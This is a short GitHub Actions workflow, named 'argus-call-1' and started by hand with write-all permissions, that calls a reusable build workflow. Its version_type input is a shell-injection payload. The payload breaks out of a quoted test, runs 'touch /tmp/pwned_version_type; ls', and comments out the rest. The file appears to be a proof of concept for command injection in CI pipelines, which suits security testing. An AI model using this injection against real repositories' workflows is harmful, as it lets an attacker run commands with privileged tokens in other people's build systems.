name: argus-call-1
on:
  workflow_dispatch:
permissions: write-all
jobs:
  call:
    uses: ./.github/workflows/build-core.yml
    with:
      version_type: "x\" ]; then :; fi; touch /tmp/pwned_version_type; ls; exit 1; #"
      version: "x"
      upstream_version: "x"
      upstream_sha: "x"
